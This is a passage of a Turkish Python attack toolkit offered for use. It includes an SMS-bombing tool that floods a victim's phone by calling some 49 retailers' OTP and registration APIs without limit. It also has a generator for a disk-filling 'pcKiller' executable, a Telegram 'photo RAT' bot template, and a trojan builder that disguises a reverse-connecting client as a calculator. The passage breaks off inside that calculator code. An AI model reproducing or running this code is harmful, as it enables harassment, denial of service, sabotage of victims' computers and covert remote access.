                "phone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "A101"
            else:
                return False, "A101"
        except:
            return False, "A101"

    def bim(number):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            payload = {
                "phone" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BIM"
            else:
                return False, "BIM"
        except:
            return False, "BIM"

    def defacto(number):
        try:
            url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
            payload = {
                "mobilePhone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["Data"]
            if r1 == "IsSMSSend":
                return True, "Defacto"
            else:
                return False, "Defacto"
        except:
            return False, "Defacto"

    def istegelsin(number):
        try:
            url = "https://prod.fasapi.net/"
            payload = {
                "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                "variables" : {
                    "phoneNumber" : f"90{number}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İsteGelsin"
            else:
                return False, "İsteGelsin"
        except:
            return False, "İsteGelsin"

    def ikinciyeni(number):
        try:
            url = "https://apigw.ikinciyeni.com/RegisterRequest"
            payload = {
                "accountType": 1,
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
                "isAddPermission": False,
                "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSucceed"]

            if r1 == True:
                return True, "İkinci Yeni"
            else:
                return False, "İkinci Yeni"
        except:
            return False, "İkinci Yeni"

    def migros(number):
        try:
            url = "https://www.migros.com.tr/rest/users/login/otp"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]

            if r1 == True:
                return True, "Migros"
            else:
                return False, "Migros"
        except:
            return False, "Migros"

    def ceptesok(number):
        try:
            url = "https://api.ceptesok.com/api/users/sendsms"
            payload = {
                "mobile_number": f"{number}",
                "token_type": "register_token"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 200:
                return True, "Cepte Şok"
            else:
                return False, "Cepte Şok"
        except:
            return False, "Cepte Şok"

    def tiklagelsin(number):
        try:
            url = "https://www.tiklagelsin.com/user/graphql"
            payload = {
                "operationName": "GENERATE_OTP",
                "variables": {
                    "phone": f"+90{number}",
                    "challenge": f"{uuid.uuid4()}",
                    "deviceUniqueId": f"web_{uuid.uuid4()}"
                },
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tıkla Gelsin"
            else:
                return False, "Tıkla Gelsin"
        except:
            return False, "Tıkla Gelsin"

    def bisu(number):
        try:
            url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BiSU"
            else:
                return False, "BiSU"
        except:
            return False, "BiSU"

    def file(number):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            payload = {
                "mobilePhoneNumber": f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["data"]
            if r1 == "200 OK":
                return True, "File"
            else:
                return False, "File"
        except:
            return False, "File"

    def ipragraz(number):
        try:
            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            payload = {
                "otp": "",
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İpragaz"
            else:
                return False, "İpragaz"
        except:
            return False, "İpragaz"

    def pisir(number):
        try:
            url = "https://api.pisir.com/v1/login/"
            payload = {"msisdn": f"90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["ok"]
            if r1 == "1":
                return True, "Pişir"
            else:
                return False, "Pişir"
        except:
            return False, "Pişir"

    def coffy(number):
        try:
            url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
            payload = {"phoneNumber": f"+90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Coffy"
            else:
                return False, "Coffy"
        except:
            return False, "Coffy"

    def sushico(number):
        try:
            url = "https://api.sushico.com.tr/tr/sendActivation"
            payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["err"]
            if r1 == 0:
                return True, "SushiCo"
            else:
                return False, "SushiCo"
        except:
            return False, "SushiCo"

    def kalmasin(number):
        try:
            url = "https://api.kalmasin.com.tr/user/login"
            payload = {
                "dil": "tr",
                "device_id": "",
                "notification_mobile": "android-notificationid-will-be-added",
                "platform": "android",
                "version": "2.0.6",
                "login_type": 1,
                "telefon": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Kalmasın"
            else:
                return False, "Kalmasın"
        except:
            return False, "Kalmasın"

    def yotto(number):
        try:
            url = "https://42577.smartomato.ru/account/session.json"
            payload = {
                "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 201:
                return True, "Yotto"
            else:
                return False, "Yotto"
        except:
            return False, "Yotto"

    def qumpara(number):
        try:
            url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
            payload = {
                "msisdn" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Qumpara"
            else:
                return False, "Qumpara"
        except:
            return False, "Qumpara"

    def aygaz(number):
        try:
            url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
            payload = {
                "Gsm" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Aygaz"
            else:
                return False, "Aygaz"
        except:
            return False, "Aygaz"

    def pawapp(number):
        try:
            url = "https://api.pawder.app/api/authentication/sign-up"
            payload = {
                "languageId" : "2",
                "mobileInformation" : "",
                "data" : {
                    "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "userAgreement" : "true",
                    "kvkk" : "true",
                    "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                    "phoneNo" : f"{number}",
                    "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "PawAPP"
            else:
                return False, "PawAPP"
        except:
            return False, "PawAPP"

    def mopas(number):
        try:
            url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
            r = requests.post(url=url, timeout=2)
            
            if r.status_code == 200:
                token = json.loads(r.text)["access_token"]
                token_type = json.loads(r.text)["token_type"]
                url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
                headers = {"authorization": f"{token_type} {token}"}
                r1 = requests.get(url=url, headers=headers, timeout=2)
                
                if r1.status_code == 200:
                    return True, "Mopaş"
                else:
                    return False, "Mopaş"
            else:
                return False, "Mopaş"
        except:
            return False, "Mopaş"

    def paybol(number):
        try:
            url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
            payload = {
                "otp_code" : "null",
                "phone_number" : f"90{number}",
                "reference_id" : "null"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            
            if r.status_code == 200:
                return True, "Paybol"
            else:
                return False, "Paybol"
        except:
            return False, "Paybol"

    def ninewest(number):
        try:
            url = "https://www.ninewest.com.tr/webservice/v1/register.json"
            payload = {
                "alertMeWithEMail" : False,
                "alertMeWithSms" : False,
                "dataPermission" : True,
                "email" : "asdafwqww44wt4t4@gmail.com",
                "genderId" : random.randint(0,3),
                "hash" : "5488b0f6de",
                "inviteCode" : "",
                "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
                "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
                "registerContract" : True,
                "registerMethod" : "mail",
                "version" : "3"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            
            if r1 == True:
                return True, "Nine West"
            else:
                return False, "Nine West"
        except:
            return False, "Nine West"

    def saka(number):
        try:
            url = "https://mobilcrm2.saka.com.tr/api/customer/login"
            payload = {
                "gsm" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == 1:
                return True, "Saka"
            else:
                return False, "Saka"
        except:
            return False, "Saka"

    def superpedestrian(number):
        try:
            url = "https://consumer-auth.linkyour.city/consumer_auth/register"
            payload = {
                "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["detail"]
            if r1 == "Ok":
                return True, "Superpedestrian"
            else:
                return False, "Superpedestrian"
        except:
            return False, "Superpedestrian"

    def hayat(number):
        try:
            url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
            r = requests.post(url=url, timeout=5)
            r1 = json.loads(r.text)["IsSuccessful"]
            if r1 == True:
                return True, "Hayat"
            else:
                return False, "Hayat"
        except:
            return False, "Hayat"

    def tazi(number):
        try:
            url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            payload = {
                "cep_tel" : f"{number}",
                "cep_tel_ulkekod" : "90"
            }
            headers = {
                "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tazı"
            else:
                return False, "Tazı"
        except:
            return False, "Tazı"

    def gofody(number):
        try:
            url = "https://backend.gofody.com/api/v1/enduser/register/"
            payload = {
                "country_code": "90",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "GoFody"
            else:
                return False, "GoFody"
        except:
            return False, "GoFody"

    def weescooter(number):
        try:
            url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
            payload = {
                "tenant": "62a1e7efe74a84ea61f0d588",
                "gsm": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Wee Scooter"
            else:
                return False, "Wee Scooter"
        except:
            return False, "Wee Scooter"

    def scooby(number):
        try:
            url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Scooby"
            else:
                return False, "Scooby"
        except:
            return False, "Scooby"

    def gez(number):
        try:
            url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["succeeded"]
            if r1 == True:
                return True, "Gez"
            else:
                return False, "Gez"
        except:
            return False, "Gez"

    def heyscooter(number):
        try:
            url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
            headers = {"user-agent" : "okhttp/3.12.1"}
            r = requests.post(url=url, headers=headers, timeout=5)
            r1 = json.loads(r.text)["IsSuccess"]
            if r1 == True:
                return True, "Hey Scooter"
            else:
                return False, "Hey Scooter"
        except:
            return False, "Hey Scooter"

    def jetle(number):
        try:
            url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Jetle"
            else:
                return False, "Jetle"
        except:
            return False, "Jetle"

    def rabbit(number):
        try:
            url = "https://api.rbbt.com.tr/v1/auth/authenticate"
            payload = {
                "mobile_number" : f"+90{number}",
                "os_name" : "android",
                "os_version" : "7.1.2",
                "app_version" : " 1.0.2(12)",
                "push_id" : "-"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == True:
                return True, "Rabbit"
            else:
                return False, "Rabbit"
        except:
            return False, "Rabbit"

    def roombadi(number):
        try:
            url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
            payload = {"phone": f"{number}", "countryId": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Roombadi"
            else:
                return False, "Roombadi"
        except:
            return False, "Roombadi"

    def hizliecza(number):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
            payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Hızlı Ecza"
            else:
                return False, "Hızlı Ecza"
        except:
            return False, "Hızlı Ecza"

    def signalall(number):
        try:
            url = "https://appservices.huzk.com/client/register"
            payload = {
                "name": "",
                "phone": {
                    "number": f"{number}",
                    "code": "90",
                    "country_code": "TR",
                    "name": ""
                },
                "countryCallingCode": "+90",
                "countryCode": "TR",
                "approved": True,
                "notifyType": 99,
                "favorites": [],
                "appKey": "live-exchange"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "SignalAll"
            else:
                return False, "SignalAll"
        except:
            return False, "SignalAll"

    def goyakit(number):
        try:
            url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["data"]["success"]
            if r1 == True:
                return True, "Go Yakıt"
            else:
                return False, "Go Yakıt"
        except:
            return False, "Go Yakıt"

    def pinar(number):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
            payload = {
                "MobilePhone" : f"{number}"
            }
            headers = {
                "devicetype" : "android",
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.text == True:
                return True, "Pınar"
            else:
                return False, "Pınar"
        except:
            return False, "Pınar"

    def oliz(number):
        try:
            url = "https://api.oliz.com.tr/api/otp/send"
            payload = {
                "mobile_number" : f"{number}",
                "type" : None
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
            if r1 == "SUCCESS_SEND_SMS":
                return True, "Oliz"
            else:
                return False, "Oliz"
        except:
            return False, "Oliz"

    def macrocenter(number):
        try:
            url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
            payload = {
                "phoneNumber" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]
            if r1 == True:
                return True, "Macro Center"
            else:
                return False, "Macro Center"
        except:
            return False, "Macro Center"

    def marti(number):
        try:
            url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
            payload = {
                "mobilePhone" : f"{number}",
                "mobilePhoneCountryCode" : "90"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Martı"    #çalma kodumu oç buradan bileceğim insta bymer_ak
            else:
                return False, "Martı"
        except:
            return False, "Martı"

    def karma(number):
        try:
            url = "https://api.gokarma.app/v1/auth/send-sms"
            payload = {
                "phoneNumber" : f"90{number}",
                "type" : "REGISTER",
                "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
                "language" : "tr-TR"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 201:
                return True, "Karma"
            else:
                return False, "Karma"
        except:
            return False, "Karma"

    def joker(number):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            payload = {
                "phone" : f"{number}"
            }
            headers = {
                "user-agent" : ""
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            r1 = json.loads(r.text)["success"]

            if r1 == True:
                return True, "Joker"
            else:
                return False, "Joker"
        except:
            return False, "Joker"

    def hop(number):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            payload = {
                "phone" : f"+90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 201:
                return True, "Hop"
            else:
                return False, "Hop"
        except:
            return False, "Hop"

    def kimgbister(number):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            payload = {
                "msisdn" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 200:
                return True, "Kim GB Ister"
            else:
                return False, "Kim GB Ister"
        except:
            return False, "Kim GB Ister"

    def anadolu(number):
        try:
            url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
            payload = urllib.parse.urlencode({
                "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
            })
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            if r.status_code == 200:
                return True, "Anadolu"
            else:
                return False, "Anadolu"
        except:
            return False, "Anadolu"

    def total(number):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
            r = requests.post(url=url, verify=False, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Total"
            else:
                return False, "Total"
        except:
            return False, "Total"

    def englishhome(number):
        try:
            url = "https://www.englishhome.com:443/enh_app/users/registration/"
            payload = {
                "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
                "phone": f"0{number}",
                "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
                "email_allowed": False,
                "sms_allowed": False,
                "confirm": True,
                "tom_pay_allowed": True
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 202:
                return True, "English Home"
            else:
                return False, "English Home"
        except:
            return False, "English Home"

    def petrolofisi(number):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            payload = {
                "approvedContractVersion": "v1",
                "approvedKvkkVersion": "v1",
                "contractPermission": True,
                "deviceId": "",
                "etkContactPermission": True,
                "kvkkPermission": True,
                "mobilePhone": f"0{number}",
                "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
                "positiveCard": "",
                "referenceCode": "",
                "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
            }
            headers = {
                "X-Channel": "IOS"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 204:
                return True, "Petrol Ofisi"
            else:
                return False, "Petrol Ofisi"
        except:
            return False, "Petrol Ofisi"

    def send_service(number, service):
        global all_sends
        global success_sends
        global failed_sends
        result = service(number=number)
        if result[0] == True:
            all_sends += 1
            success_sends += 1
            print(f"[+] {all_sends} {result[1]}")
        else:
            all_sends += 1
            failed_sends += 1
            print(f"[-] {all_sends} {result[1]}")

    def send(number, amount, worker_amount):
        global clear
        global all_sends
        global success_sends
        global failed_sends
        start_time = int(time.perf_counter())
        functions = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
        random.shuffle(functions)
        clear()
        print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
        if amount == 0:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                i = 0
                while True:
                    executor.submit(send_service, number, functions[i % 49])
                    i += 1
                    if i == len(functions):
                        i = 0
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                for i in range(amount):
                    executor.submit(send_service, number, functions[i % 49])
        print("\nGönderim tamamlandı!")
        print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
        all_sends = 0
        success_sends = 0
        failed_sends = 0
        restart()

    def watermark():
        print("SMS Tool by HeJo-1 ")

    def get_number():
        global clear
        while True:
            try:
                number = int(input(f"""Telefon numarasını yazın. Şunun gibi: "54xxxxxxxx" (Sadece Türkiye numaralarında çalışır!)\n[?] : """))
                if len(str(number)) == 10 and str(number)[0] == "5":
                    return number
                else:
                    clear()
                    print(f"Yanlış numara biçimi girildi.")
            except:
                clear()
                print(f"Lütfen bir numara yazın.")

    def get_amount():
        global clear
        while True:
            try:
                amount = int(input(f"""Kaç SMS gönderilsin? Sınırsız gönderim için "0" basın.\n[?] : """))
                if amount >= 0:
                    return amount
                else:
                    clear()
                    print(f"Girilen sayı 0'dan küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")

    def get_worker_amount():
        global clear
        while True:
            try:
                worker_amount = int(input(f"Thread sayısını girin. Tavsiye edilen 5-100 arasıdır.\n[?] : "))
                if worker_amount >= 1:
                    return worker_amount
                else:
                    clear()
                    print(f"Girilen sayı 1'den küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")

    def restart():
        global clear
        while True:
            question = input(f"Programdan çıkılsın mı?\n[Y/N] : ").upper().replace(" ", "")
            if question == "Y":
                quit()
            elif question == "N":
                clear()
                start()
                break
            else:
                clear()
                print(f"Yanlış tuşa basıldı!")

    def start():
        global clear
        clear()
        watermark()
        number = get_number()
        amount = get_amount()
        worker_amount = get_worker_amount()
        send(number=number, amount=amount, worker_amount=worker_amount)

    all_sends = 0
    success_sends = 0
    failed_sends = 0
    clear = lambda: os.system("cls")

    start()

def dork():
    
    def scrape_google_links(query_url, num_pages):
        all_links = set()

        for page in range(1, num_pages + 1):
            page_url = f"{query_url}&start={(page - 1) * 10}"
            response = requests.get(page_url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                for anchor in soup.find_all('a'):
                    href = anchor.get('href')
                    if href.startswith('/url?q='):
                        link = href[7:href.find('&')]
                        all_links.add(link)

        return all_links


    query = input("Arama sorgusunu girin: ")
    num_pages = int(input("Araştırılacak sayfa sayısını girin: "))
    url = f"https://www.google.com/search?q={query}"
    links = scrape_google_links(url, num_pages)
    if links:
        output_file = input("Çıktı dosya adını girin (uzantısı olmadan): ")
        output_format = input("Çıktı formatını girin (txt veya excel): ")
        if output_format == 'txt':
            with open(f"{output_file}.txt", 'w') as file:
                for link in links:
                    file.write(link + '\n')
            print("Links saved to a txt file.")
        elif output_format == 'excel':
            wb = openpyxl.Workbook()
            ws = wb.active
            ws.title = "Links"
            for index, link in enumerate(links, start=1):
                ws.cell(row=index, column=1, value=link)
            excel_file = f"{output_file}.xlsx"
            wb.save(excel_file)
            print(f"Links saved to an Excel file: {excel_file}")
        else:
            print("Invalid output format. Supported formats: txt or excel.")
    else:
        print("No links found.")

def pcKiller():
    kod = '''
import random
def generate_random_data(size):
    return ''.join(chr(random.randint(0, 127)) for _ in range(size))
def create_large_text_file(file_path, size_gb):
    size_bytes = size_gb * 1024 * 1024 * 1024
    with open(file_path, 'wb') as file:
        while size_bytes > 0:
            chunk_size = min(size_bytes, 100 * 1024 * 1024)  # 100MB
            data = generate_random_data(chunk_size)
            file.write(data.encode('ascii'))
            size_bytes -= len(data)
if __name__ == "__main__":
    for i in range(1000):
        file_path = f"large_file_{i}.txt"
        size_gb = 1
        create_large_text_file(file_path, size_gb)
        print(f"{file_path} dosyası oluşturuldu ve içine yaklaşık 1GB veri yazıldı.")
            
'''
    print("[1] .py olarak kayot et\n[2] .exe olarak kayıt et")
    c = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/PcKiller/DosyaKayıtEtme$ "))
    if c == 1:
        ths = open("pcKiller.py", "w")
        ths.write(kod)
        print("Dosya 'pcKiller.py' olarak kayıt edildi")
        time.sleep(2)
    if c == 2:
        ths = open("pcKiller.py", "w")
        ths.write(kod)
        subprocess.run(["pyinstaller", "--onefile", "pcKiller.py"], check=True)
        print("'pcKiller.exe' olarak kayıt edildi")
        time.sleep(2)

def telegram():
    print('''
[1] Foto Rat
''')
    c = int(input(f"HeJo@{user}:~/Rat/Telegram$ "))
    
    if c == 1:
        token = input("Bot Tokeni : ")
        fotorat = f'''
import telebot

# Telegram bot tokeninizi buraya ekleyin
TOKEN = '{token}'
bot = telebot.TeleBot(TOKEN)

# Dinleme durumu ve kullanıcının ID'si
listening = False
listener_id = None

# Dinleme komutu
@bot.message_handler(commands=['ac'])
def start_listening(message):
    global listening, listener_id
    listening = True
    listener_id = message.chat.id
    bot.reply_to(message, "Dinlemeye başladım, biri /start komutunu verirse fotoğraf çekilecek.")

# Start komutu
@bot.message_handler(commands=['start'])
def take_photo(message):
    global listening, listener_id
    if listening:
        # Fotoğraf çekme işlemi burada yapılmalı
        # Örnek olarak bir sabit resim gönderiyoruz
        bot.send_message(listener_id, "fotoğraf çekti!")

        # Ön ve arka kamera resimlerini çekip göndermek burada yapılmalı
        # Bu kısmı sizin implement etmeniz gerekebilir
        # Örnek olarak bir dosya gönderme
        try:
            with open('on_kamera_foto.jpg', 'rb') as photo:
                bot.send_photo(listener_id, photo)
        except FileNotFoundError:
            bot.send_message(listener_id, "Ön kamera fotoğrafı bulunamadı.")

        try:
            with open('arka_kamera_foto.jpg', 'rb') as photo:
                bot.send_photo(listener_id, photo)
        except FileNotFoundError:
            bot.send_message(listener_id, "Arka kamera fotoğrafı bulunamadı.")
    else:
        bot.reply_to(message, "Şu anda dinlemiyorum.")

# Botu çalıştırma
bot.polling()
'''
        # Kullanıcıdan dosya ismi alıyoruz
        filename = input("Kaydedilecek dosya ismi (örn: bot.py): ")
        
        # Dosyayı yazıyoruz
        with open(filename, 'w') as f:
            f.write(fotorat)
        print(f"{filename} dosyasına başarıyla yazıldı.")

    else:
        print("Geçersiz seçenek.")

    
def trojenOluşturucu():
    print("sen.py dosyası sizde kalacak o.py dosyayını hesef kişiye göndereceksiniz...")


    print("Host")
    host = str(input("> "))

    print("Port")
    port = str(input("> "))

    sen = f'''
    import socket

    host = '{host}'
    port = {port}

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    def send_command(message):
        if message != "":
            client_socket.send(message.encode())
            data = client_socket.recv(1024).decode()
            if message.startswith("ip"):
                print("IPv4 and IPv6 addresses:")
                print(data)
            else:
                print("Response from server: " + str(data))

    message = input(">> ")

    while message != "exit":
        if message.startswith("get"):
            # Dosya isteği yaparken sunucuya dosya adını bildirin
            client_socket.send(message.encode())
            file_data = client_socket.recv(1024).decode()
            print("File content:\n" + file_data)
        else:
            send_command(message)
        message = input(">> ")

    client_socket.close()
    '''

    o = f'''
    import threading
    import tkinter as tk
    import socket
    import subprocess as s

    # Hesap makinesi kodunu fonksiyon içine alalım
    def run_calculator():
        def button_click(number):
            current = entry.get()
            entry.delete(0, tk.END)
            entry.insert(0, str(current) + str(number))

        def button_clear():
            entry.delete(0, tk.END)

        def button_add():
            first_number = entry.get()
            global f_num
            global math
            math = "addition"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_subtract():
            first_number = entry.get()
            global f_num
            global math
            math = "subtraction"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_multiply():
            first_number = entry.get()
            global f_num
            global math
            math = "multiplication"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_divide():
            first_number = entry.get()
            global f_num
            global math
            math = "division"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_equal():
            second_number = entry.get()
            entry.delete(0, tk.END)
            if math == "addition":
                entry.insert(0, f_num + float(second_number))
            elif math == "subtraction":
                entry.insert(0, f_num - float(second_number))
            elif math == "multiplication":
                entry.insert(0, f_num * float(second_number))
            elif math == "division":
                entry.insert(0, f_num / float(second_number))

        root = tk.Tk()
        root.title("Hesap Makinesi")

        entry = tk.Entry(root, width=35, borderwidth=5)
        entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

        # Butonlar
